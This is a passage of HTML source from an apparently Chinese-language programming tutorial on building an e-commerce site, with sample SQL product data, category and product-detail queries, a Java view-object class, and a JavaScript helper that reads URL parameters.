punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">,</span><span class="token string">'商品12'</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'13'</span><span class="token punctuation">,</span><span class="token string">'商品13'</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'14'</span><span class="token punctuation">,</span><span class="token string">'商品14'</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'15'</span><span class="token punctuation">,</span><span class="token string">'商品15'</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'16'</span><span class="token punctuation">,</span><span class="token string">'商品16'</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'17'</span><span class="token punctuation">,</span><span class="token string">'商品17'</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product<span class="token punctuation">(</span>product_id<span class="token punctuation">,</span>product_name<span class="token punctuation">,</span>category_id<span class="token punctuation">,</span>root_category_id<span class="token punctuation">,</span>sold_num<span class="token punctuation">,</span>product_status<span class="token punctuation">,</span>content<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'18'</span><span class="token punctuation">,</span><span class="token string">'商品18'</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'商品说明'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">-- 添加商品图片</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'9'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'10'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'11'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'13'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'14'</span><span class="token punctuation">,</span><span class="token string">'10'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'15'</span><span class="token punctuation">,</span><span class="token string">'11'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'16'</span><span class="token punctuation">,</span><span class="token string">'12'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'17'</span><span class="token punctuation">,</span><span class="token string">'13'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'18'</span><span class="token punctuation">,</span><span class="token string">'14'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'19'</span><span class="token punctuation">,</span><span class="token string">'15'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'20'</span><span class="token punctuation">,</span><span class="token string">'16'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'21'</span><span class="token punctuation">,</span><span class="token string">'17'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> product_img<span class="token punctuation">(</span>id<span class="token punctuation">,</span>item_id<span class="token punctuation">,</span>url<span class="token punctuation">,</span>sort<span class="token punctuation">,</span>is_main<span class="token punctuation">,</span>created_time<span class="token punctuation">,</span>updated_time<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'22'</span><span class="token punctuation">,</span><span class="token string">'18'</span><span class="token punctuation">,</span><span class="token string">'wwxb_1.png'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">,</span><span class="token string">'2021-04-26 11:11:11'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>查询SQL</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询所有的一级分类</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> category <span class="token keyword">where</span> category_level<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">-- 查询每个分类下销量前6的商品</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> product <span class="token keyword">where</span> root_category_id<span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">order</span> <span class="token keyword">by</span> sold_num <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">;</span><span class="token comment">-- 查询每个商品的图片</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> product_img <span class="token keyword">where</span> item_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>实体类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Data</span><span class="token annotation punctuation">@NoArgsConstructor</span><span class="token annotation punctuation">@AllArgsConstructor</span><span class="token annotation punctuation">@ToString</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CategoryVO</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> categoryId<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> categoryName<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> categoryLevel<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> parentId<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> categoryIcon<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> categorySlogan<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> categoryPic<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> categoryBgColor<span class="token punctuation">;</span>    <span class="token comment">//实现首页的类别显示</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">CategoryVO</span><span class="token punctuation">&gt;</span></span> categories<span class="token punctuation">;</span>    <span class="token comment">//实现首页分类商品推荐</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ProductVO</span><span class="token punctuation">&gt;</span></span> products<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在Mapper接口中定义查询方法</p><table><thead><tr><th>CategoryMapper</th></tr></thead><tbody><tr><td><img src="imgs/1619406334330.png" alt="1619406334330"></td></tr></tbody></table><table><thead><tr><th>ProductMapper</th></tr></thead><tbody><tr><td><img src="imgs/1619406609467.png" alt="1619406609467"></td></tr></tbody></table></li><li><p>映射配置</p><table><thead><tr><th>ProductMapper.xml</th></tr></thead><tbody><tr><td><img src="imgs/1619406820361.png" alt="1619406820361"></td></tr></tbody></table><table><thead><tr><th>CategoryMapper.xml</th></tr></thead><tbody><tr><td><img src="imgs/1619406932819.png" alt="1619406932819"></td></tr></tbody></table></li></ul><h6 id="11-2-2-业务层实现"><a href="#11-2-2-业务层实现" class="headerlink" title="11.2.2 业务层实现"></a>11.2.2 业务层实现</h6><h6 id="11-2-3-控制层实现"><a href="#11-2-3-控制层实现" class="headerlink" title="11.2.3 控制层实现"></a>11.2.3 控制层实现</h6><h4 id="11-3-前端实现"><a href="#11-3-前端实现" class="headerlink" title="11.3 前端实现"></a>11.3 前端实现</h4><h2 id="十二、商品详情展示—显示商品基本信息"><a href="#十二、商品详情展示—显示商品基本信息" class="headerlink" title="十二、商品详情展示—显示商品基本信息"></a>十二、商品详情展示—显示商品基本信息</h2><blockquote><p>点击首页推荐的商品、轮播图商品广告、商品列表页面点击商品，就会进入到商品的详情页面</p></blockquote><h4 id="12-1-流程分析"><a href="#12-1-流程分析" class="headerlink" title="12.1 流程分析"></a>12.1 流程分析</h4><p><img src="imgs/1619418211550.png" alt="1619418211550"></p><h4 id="12-2-商品基础信息-接口实现"><a href="#12-2-商品基础信息-接口实现" class="headerlink" title="12.2 商品基础信息-接口实现"></a>12.2 商品基础信息-接口实现</h4><blockquote><p>商品基本信息、商品套餐、商品图片</p></blockquote><ul><li><p>SQL</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 根据id查询商品基本信息</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> product <span class="token keyword">where</span> product_id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">-- 根据商品id查询当前商品的图片（√）</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> product_img <span class="token keyword">where</span> item_id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">-- 根据商品id查询当前商品的套餐</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> product_sku <span class="token keyword">where</span> product_id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>因为上述的三个查询都是单表查询，可以通过tkmapper完成，无需在Mapper接口定义新的方法</p></li><li><p>业务层实现</p><table><thead><tr><th>ProductService接口</th></tr></thead><tbody><tr><td><img src="imgs/1619486681545.png" alt="1619486681545"></td></tr></tbody></table><table><thead><tr><th>ProductServiceImpl类实现</th></tr></thead><tbody><tr><td><img src="imgs/1619486779673.png" alt="1619486779673"></td></tr></tbody></table></li><li><p>控制层实现</p><table><thead><tr><th>ProductController类</th></tr></thead><tbody><tr><td><img src="imgs/1619486849902.png" alt="1619486849902"></td></tr></tbody></table></li></ul><h4 id="12-3-商品基础信息-前端显示"><a href="#12-3-商品基础信息-前端显示" class="headerlink" title="12.3 商品基础信息-前端显示"></a>12.3 商品基础信息-前端显示</h4><h2 id="十三、商品详情展示—显示商品参数信息"><a href="#十三、商品详情展示—显示商品参数信息" class="headerlink" title="十三、商品详情展示—显示商品参数信息"></a>十三、商品详情展示—显示商品参数信息</h2><h4 id="13-1-接口实现"><a href="#13-1-接口实现" class="headerlink" title="13.1 接口实现"></a>13.1 接口实现</h4><blockquote><p>根据商品id查询商品参数信息</p></blockquote><ul><li><p>数据库操作直接只用tkMapper的默认方法实现</p></li><li><p>业务层实现</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619495826781.png" alt="1619495826781"></td></tr></tbody></table></li><li><p>控制层实现</p></li></ul><h4 id="13-2-前端显示商品参数"><a href="#13-2-前端显示商品参数" class="headerlink" title="13.2 前端显示商品参数"></a>13.2 前端显示商品参数</h4><h4 id="13-3-前端显示商品细节"><a href="#13-3-前端显示商品细节" class="headerlink" title="13.3 前端显示商品细节"></a>13.3 前端显示商品细节</h4><h6 id="前端页面间URL传值"><a href="#前端页面间URL传值" class="headerlink" title="前端页面间URL传值"></a>前端页面间URL传值</h6><ul><li><p>utils.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getUrlParam</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> arr <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length<span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> params <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>params<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> param <span class="token operator">=</span> params<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//"pid=101"</span><span class="token keyword">if</span><span class="token punctuation">(</span>param<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> key <span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> param<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>a.html</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token 